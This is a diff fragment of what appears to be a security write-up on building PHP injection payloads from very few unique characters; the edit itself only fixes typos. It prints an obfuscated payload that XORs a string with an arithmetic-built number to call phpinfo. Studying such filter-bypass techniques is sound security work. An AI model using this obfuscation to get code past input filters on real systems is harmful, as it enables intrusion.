@@ -143,7 +143,7 @@ Those are possible pairs to encode given character. In order to minimise unique 
 * characters which already exist in our payload (TRIM)
 * minimum number of characters with which we can encode all chars (re-use already chosen characters)
 
-This way, we encode `phpinfo` as `AYAYYRY ^ 1110746`, ant thus generate payload with less then 14 unique chars:
+This way, we encode `phpinfo` as `AYAYYRY ^ 1110746`, and thus generate payload with less than 14 unique chars:
 ```
 (AYAYYRY^trim(((((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i)))+(((!!i+!!i))**((!!i))))))();
 ```
